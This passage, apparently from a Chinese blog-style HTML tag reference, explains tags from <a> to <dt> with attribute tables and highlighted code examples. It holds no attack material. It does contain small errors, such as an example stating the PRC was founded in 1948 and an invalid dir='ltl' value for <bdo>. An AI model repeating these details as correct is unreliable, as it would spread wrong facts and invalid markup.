</p><ul><li><code>&lt;a href=&quot;http://ainiya.xyz&quot;&gt;我的博客&lt;/a&gt;&quot;</code>  </li></ul></li><li><p><code>&lt;abbr&gt;</code> 缩写  </p><ul><li><code>The &lt;abbr title=&quot;People&#39;s Republic of China&quot;&gt;PRC&lt;/abbr&gt; was founded in 1948.</code>  </li></ul></li><li><p><code>&lt;address&gt;</code> 标签定义文档作者或拥有者的联系信息  </p><ul><li>如果 <code>&lt;address&gt;</code> 元素位于 <code>&lt;article&gt;</code> 元素内部，则它表示该文章作者或拥有者的联系信息  </li><li><code>&lt;address&gt;</code> 元素通常呈现为斜体。大多数浏览器会在该元素的前后添加换行  <pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>address</span><span class="token punctuation">></span></span>   Written by W3School.com.cn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mailto:us@example.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Email us<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>   Address: Box 564, Disneyland<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>   Phone: +12 34 56 78   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>address</span><span class="token punctuation">></span></span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><code>&lt;area&gt;</code> 定义图像映射中的区域  </p><ul><li>可以定义图片中的一个区域到超链接  </li></ul></li><li><p><code>&lt;article&gt;</code> 定义外部内容  </p><ul><li>外部内容可以是来自一个外部的新闻提供者的一篇新的文章，或者来自 blog 的文本，或者是来自论坛的文本。 亦或是来自其他外部源内容  </li><li>标签的内容独立于文档的其余部分  </li><li>和超链接有些相似,但这个试试将其页面进行了加载,没有进行跳转操作  </li></ul></li><li><p><code>&lt;b&gt;</code>  </p><ul><li>定义粗体文本  </li><li>定义部分比文本中的其他部分更重要  </li><li><code>the house with the &lt;b&gt;red&lt;/b&gt; door</code>  </li></ul></li><li><p><code>&lt;base&gt;</code>  </p><ul><li><p>为页面上的所有链接规定默认地址或默认目标  </p></li><li><p>使用指定的基本 URL 来解 析所有的相对 URL。这其中包括 <code>&lt;a&gt;、&lt;img&gt;、&lt;link&gt;、&lt;form&gt;</code> 标签中的 URL  </p></li><li><p>把 <code>&lt;base&gt;</code> 标签排在 head 元素中第一个元素的位置，这样 head 中其他元素就可以利用 <code>&lt;base&gt;</code> 元素中的信息了  </p></li><li><p>属性</p><table><thead><tr><th align="center">属性</th><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">href</td><td align="center">URL</td><td align="center">规定作为基准 URL 在页面中使用的 URL</td></tr><tr><td align="center">target</td><td align="center">_blank \ _parent \ _self \ _top</td><td align="center">在何处打开页面上的链接。该属性会被每个链接中的 target 属性覆盖</td></tr></tbody></table></li><li><p>简单代码  </p><pre class="line-numbers language-html"><code class="language-html">   <span class="token doctype">&lt;!doctype html></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://mpic.tiankong.com/<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fff/a07/fffa07d7409dfcad0ca9f996f42a9112/640.jpg@!240h<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>             美丽的图片             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><code>&lt;bdo&gt;</code>  </p><ul><li>覆盖默认的文本方向  </li><li>支持所有标准事件和属性  </li><li><code>&lt;bdo dir=&quot;rtl&quot;&gt;Here is some text&lt;/bdo&gt;</code> 从右向左  </li><li><code>&lt;bdo dir=&quot;ltl&quot;&gt;Here is some text&lt;/bdo&gt;</code> 从左向右  </li></ul></li><li><p><code>&lt;blockquote</code>  </p><ul><li><p>定义摘自另一个源块引用  </p></li><li><p>之间的文本通常会进行缩进,以从常规文本中脱离出来  </p></li><li><p>如果是标记不需要段落分割的短引用,可以使用<code>&lt;p&gt;</code>标签  </p></li><li><p>属性<code>cite</code> 引用的URL, 如果引用来自网络  </p></li><li><p>简单代码  </p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>About WWF<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Here is a quote from WWF's website:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>blockquote</span> <span class="token attr-name">cite</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.worldwildlife.org/who/index.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      For 50 years, WWF has been protecting the future of nature. The worlds leading conservation organization, WWF works in 100 countries and is supported by 1.2 million members in the United States and close to 5 million globally.  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>blockquote</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><code>&lt;body&gt;</code>  </p><ul><li>定义文档的主题  </li><li><code>&lt;body&gt;</code> 包含文档的所有内容， 比如文档，超链接，图表， 表格，列表等  </li></ul></li><li><p><code>&lt;br/&gt;</code>  </p><ul><li>插入简单的换行符  </li><li>这是一个空标签,没有结束符  </li><li>标签来输入空行，而不是分隔段落  </li><li>简单代码  <pre class="line-numbers language-html"><code class="language-html">hello tom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>我不是一个人，两个人  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p><code>&lt;button&gt;</code>  </p><ul><li><p>定义按钮  </p></li><li><p>可在button元素放至内容， 比如文本或者图像，这是该元素与通过input元素创建的按钮的不同之处。  </p></li><li><p>请始终为按钮规定type属性。不同的浏览器根据type属性使用不同的默认值  </p></li><li><p>如果在HTML表单中使用button元素，不同的浏览器会提交不同的按钮值，请使用input元素在html表单中创建按钮  </p></li><li><p>相关属性  </p><table><thead><tr><th align="center">属性</th><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">autofocus</td><td align="center">autofocus</td><td align="center">如果设置,则当页面完成加载后使该按钮会的焦点</td></tr><tr><td align="center">disabled</td><td align="center">disabled</td><td align="center">禁用按钮</td></tr><tr><td align="center">form</td><td align="center">form_name</td><td align="center">规定按钮属于哪个表单</td></tr><tr><td align="center">formaction</td><td align="center">url</td><td align="center">规定当提交表单时向何处提交表单数据.并覆盖表单的 action 属性,该属性与 type=”submit” 配合使用。</td></tr><tr><td align="center">formmethod</td><td align="center">delete/get/post/put</td><td align="center">规定如何发送表单数据，覆盖表单的method属性,该属性与 type=”submit” 配合使用。</td></tr><tr><td align="center">formnovalidate</td><td align="center">formnovalidate</td><td align="center">如果设置，指示在提交时是否验证表单，覆盖表单的novalidate属性,该属性与 type=”submit” 配合使用。</td></tr><tr><td align="center">formtarget</td><td align="center">_blank/_self/_parent/_top/framename</td><td align="center">规定在何处打开action中的RUL。覆盖表单的target属性,该属性与 type=”submit” 配合使用。</td></tr><tr><td align="center">name</td><td align="center">button_name</td><td align="center">规定按钮名称</td></tr><tr><td align="center">type</td><td align="center">button/reset/submit</td><td align="center">定义按钮类型</td></tr><tr><td align="center">value</td><td align="center">some_value</td><td align="center">规定按钮的初始值。可有脚本进行修改</td></tr></tbody></table></li></ul></li><li><p><code>&lt;canvas&gt;</code>  </p><ul><li>标签定义图形，比如图表和其他图像  </li><li>可以使用JavaScript在其区域内进行绘图  </li><li>属性height， width  </li><li><code>&lt;canvas id=&quot;myCanvas&quot; height=&quot;50&quot; width=&quot;50&quot;&gt;&lt;/canvas&gt;</code>  </li></ul></li><li><p><code>&lt;caption&gt;</code>  </p><ul><li>定义表格标题  </li><li>必须紧随<code>&lt;table&gt;</code>标签之后  </li><li>只能对每个表格定义一个标题  </li><li>使用css更改其位置  </li><li>支持html的标准属性  </li><li>支持html的事件属性  </li></ul></li><li><p>短语元素<code>&lt;em&gt; &lt;strong&gt; &lt;dfn&gt; &lt;code&gt; &lt;samp&gt; &lt;kbd&gt; &lt;var&gt; &lt;cite&gt;</code>  </p><table><thead><tr><th align="center">标签</th><th align="center">用途</th></tr></thead><tbody><tr><td align="center"><code>&lt;em&gt;</code></td><td align="center">呈现为被强调的文本</td></tr><tr><td align="center"><code>&lt;strong&gt;</code></td><td align="center">定义重要的文本</td></tr><tr><td align="center"><code>&lt;dfn&gt;</code></td><td align="center">定义一个定义项目</td></tr><tr><td align="center"><code>&lt;code&gt;</code></td><td align="center">定义计算机代码文本</td></tr><tr><td align="center"><code>samp</code></td><td align="center">定义样本文本</td></tr><tr><td align="center"><code>&lt;kbd&gt;</code></td><td align="center">定义键盘文本。表示文本是从键盘上键入的。通常用于与计算机相关的文档或手册中</td></tr><tr><td align="center"><code>&lt;var&gt;</code></td><td align="center">定义变量。可以将其与<code>&lt;pre&gt;</code>及<code>&lt;code&gt;</code>标签配合使用</td></tr><tr><td align="center"><code>&lt;cite&gt;</code></td><td align="center">定义引用。可以使用该标签对参考文献的引用进行定义，不如书籍或杂志的标题</td></tr></tbody></table></li><li><p><code>&lt;col&gt;</code>  </p><ul><li>为表格中的一个或多个列定义属性值  </li><li>只能在表格或列组中使用该元素  </li><li>col元素是空元素。如需创建列，必须在 tr 元素内规定 td 元素  </li><li>如果需要为一个或多个列规定属性值，使用该元素  </li><li>如果需要向一个列组规定相同的属性值，使用<code>&lt;colgroup&gt;</code>元素  </li><li>属性<code>span</code> 定义<code>&lt;col&gt;</code>应当横跨的列数  </li><li>简单代码  <pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>col</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>blue</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>col</span> <span class="token attr-name">span</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>blue</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><code>&lt;colgroup&gt;</code>  </p><ul><li>定义表格列的组。通过此标签，可以对列进行组合，以便格式化  </li><li>该元素只有在 <code>&lt;table&gt;</code> 中 才是合法的  </li><li>colgroup 元素只能包含 col 元素。  </li><li>colgroup 元素无法创建表格列。如需创建列，必须在 tr 元素内规定 td 元素  </li><li>如果需要向一个列组规定相同的属性值，请使用该元素  </li><li>如果需要为一个或多个列规定属性值，请使用 col 元素  </li><li>性<code>span</code> 定义<code>&lt;colgroup&gt;</code>应当横跨的列数  </li><li>简单代码  <pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>colgroup</span> <span class="token attr-name">span</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>blue</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>colgroup</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><code>&lt;command&gt;</code>  </p><ul><li>标签定义命令按钮，比如单选按钮、复选框或按钮  </li><li>但目前仅有ie9支持,所以没什么用,不写了  </li></ul></li><li><p><code>&lt;datalist&gt;</code>  </p><ul><li>定义选项列表  </li><li>与input元素配合使用,来定义input可能的值  </li><li>datalist及其选项当点击时会被显示出来,它仅仅是合法的输入值列表  </li><li>使用 input 元素的 list 属性来绑定 datalist  </li><li>例子  <pre class="line-numbers language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myCar<span class="token punctuation">"</span></span> <span class="token attr-name">list</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cars<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>datalist</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cars<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>BMW<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Ford<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Volvo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>datalist</span><span class="token punctuation">></span></span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>更新2019-04-22</p></blockquote></li></ul></li><li><p><code>&lt;dd&gt;</code>  </p><ul><li>定义一个定义列表中对项目的描述  </li><li>例子  <pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>一个定义列表：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>计算机<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>用来计算的仪器 ... ...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>显示器<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>以视觉方式显示信息的装置 ... ...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Coffee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>Black hot drink<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Milk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>White cold drink<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><code>&lt;del&gt;</code>  </p><ul><li>定义文档中已删除的文本  </li><li>与 <ins> 一起使用，描述文档中的更新和修正  </ins></li><li>属性<code>cite</code>值是<code>url</code>定义指向另一文档的url,该文档解释了文本被删除的原因  </li><li>属性<code>datetime</code>值<code>YYYY-MM-DDThh:mm:ssTZD</code> 定义文本被删除的日期和时间  </li><li><code>&lt;p&gt;a dozen is &lt;del&gt;21&lt;/del&gt; 12 pieces&lt;/p&gt;</code>  </li></ul></li><li><p><code>&lt;details&gt;</code>  </p><ul><li>用于描述文档或文档某个部分的细节  </li><li>与 <code>&lt;summary&gt;</code> 标签配合使用可以为 details 定义标题。标题是可见的，用户点击标题时，会显示出 details  </li><li>属性<code>open</code>值<code>open</code>定义detail是否可见  </li><li><code>&lt;details&gt;This document was written in 2010.&lt;/details&gt;</code>  </li></ul></li><li><p><code>&lt;div&gt;</code>  </p><ul><li>签定义文档中的 division/section,章节  </li><li>使用 <code>&lt;div&gt;</code> 标签对块级元素进行组合，这样就可以使用样式对它们进行格式化。   <pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span><span class="token hexcode">#00FF00</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>This is a header<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>This is a paragraph.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><code>&lt;dl&gt;</code>  </p><ul><li>定义一个列表  <pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Coffee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>Black hot drink<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Milk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>White cold drink<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><code>&lt;dt&gt;</code>  </p><ul><li>定义一个定义列表中的一个项目，以及dialog中的角色  <pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>--例子1--</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Coffee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>Black hot drink<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Milk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>White cold drink<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>--例子2--</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dialog</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>老师<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>2+2 等于？<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>学生<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>老师<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>答对了！<span class="token tag"><span class="token tag"><span class="token 